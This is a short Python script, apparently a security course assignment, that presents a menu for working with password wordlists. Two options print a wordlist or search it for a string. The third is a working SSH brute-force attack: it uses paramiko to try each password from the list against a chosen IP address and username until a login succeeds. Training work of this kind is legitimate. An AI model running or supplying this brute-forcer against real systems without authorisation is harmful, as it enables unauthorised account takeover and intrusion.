#!/usr/bin/env python3

# Script Name:                  ops-401d1:Challenge17.py
# Author:                       Cody Blahnik
# Date of latest revision:      5/20/24
# Purpose:                      Brute force tool using wordlists

import time
import paramiko

# Function to perform offensive task
def offensive():
    file_path = input("Enter the word list file path: ")
    delay = float(input("Enter the delay between words (in seconds): "))
    
    try:
        with open(file_path, encoding="ISO-8859-1") as file:
            for word in file:
                word = word.strip()
                print(word)
                time.sleep(delay)
    except FileNotFoundError:
        print(f"File not found: {file_path}")

# Function to perform defensive task
def defensive():
    user_string = input("Enter the string to search for: ")
    file_path = input("Enter the word list file path: ")

    try:
        with open(file_path, encoding="ISO-8859-1") as file:
            word_list = [word.strip() for word in file]
            
        if user_string in word_list:
            print(f"The string '{user_string}' was found in the word list.")
        else:
            print(f"The string '{user_string}' was NOT found in the word list.")
    except FileNotFoundError:
        print(f"File not found: {file_path}")

# Function to perform SSH brute force attack
def ssh_brute_force():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ip_address = input("Enter the SSH server IP address: ")
    username = input("Enter the SSH username: ")
    file_path = input("Enter the word list file path: ")
    delay = float(input("Enter the delay between attempts (in seconds): "))

    try:
        with open(file_path, encoding="ISO-8859-1") as file:
            for password in file:
                password = password.strip()
                try:
                    ssh.connect(ip_address, username=username, password=password)
                    print(f"Login successful with password: {password}")
                    return
                except paramiko.AuthenticationException:
                    print(f"Failed login with password: {password}")
                time.sleep(delay)
        print("Brute force attempt complete. No valid password found.")
    except FileNotFoundError:
        print(f"File not found: {file_path}")
    finally:
        ssh.close()

# Main menu for user interaction
def main():
    print("Automated Brute Force Wordlist")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    print("3. SSH Brute Force")
    choice = input("Select an option (1, 2, or 3): ")

    if choice == '1':
        offensive()
    elif choice == '2':
        defensive()
    elif choice == '3':
        ssh_brute_force()
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
